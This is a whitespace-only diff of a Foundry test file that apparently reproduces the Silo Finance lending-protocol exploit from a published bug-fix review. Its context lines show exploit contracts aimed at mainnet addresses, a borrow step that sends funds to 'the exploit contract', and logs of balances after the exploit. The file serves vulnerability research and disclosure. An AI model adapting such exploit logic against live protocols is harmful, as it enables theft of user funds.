@@ -9,6 +9,7 @@ import "./../interface.sol";
 // analysis and code: https://medium.com/immunefi/silo-finance-logic-error-bugfix-review-35de29bd934a
 
 interface ISilo {
+
     function deposit(
         address _asset,
         uint256 _amount,
@@ -20,9 +21,11 @@ interface ISilo {
     function assetStorage(address _asset) external view returns (IBaseSilo.AssetStorage memory);
 
     function accrueInterest(address _asset) external returns (uint256 interest);
+
 }
 
 interface IBaseSilo {
+
     /// @dev Storage struct that holds all required data for a single token market
     struct AssetStorage {
         /// @dev Token that represents a share in totalDeposits of Silo
@@ -40,11 +43,13 @@ interface IBaseSilo {
         /// @dev DEBT: Amount of asset token that has been borrowed with accrued interest.
         uint256 totalBorrowAmount;
     }
+
 }
 
 interface IShareToken {}
 
 contract OtherAccount {
+
     ISilo immutable SILO;
     IERC20 public constant WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
     IERC20 public constant LINK = IERC20(0x514910771AF9Ca656af840dff83E8264EcF986CA);
@@ -69,9 +74,11 @@ contract OtherAccount {
         SILO.borrow(address(WETH), 1 ether);
         WETH.transfer(owner, 1 ether); // Return the borrowed amount to the exploit contract
     }
+
 }
 
 contract SiloBugFixReview {
+
     ISilo public constant SILO = ISilo(0xcB3B879aB11F825885d5aDD8Bf3672596d35197C);
     IERC20 public constant XAI = IERC20(0xd7C9F0e536dC865Ae858b0C0453Fe76D13c3bEAc);
     IERC20 public constant WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
@@ -112,10 +119,12 @@ contract SiloBugFixReview {
         console.log("Balance of XAI after exploit= ", XAI.balanceOf(address(this)));
         console.log("WETH interest rate after exploit = ", accrueInterest);
     }
+
 }
 
 // forge test --match-path test/pocs/posterms/silo-finance/BugFixReview.t.sol -vvv
 contract SiloBugFixReviewTest is Test {
+
     uint256 mainnetFork;
 
     SiloBugFixReview public siloBugFixReview;
@@ -161,4 +170,5 @@ contract SiloBugFixReviewTest is Test {
         console.log("block number after = ", block.number);
         siloBugFixReview.run2();
     }
+
 }
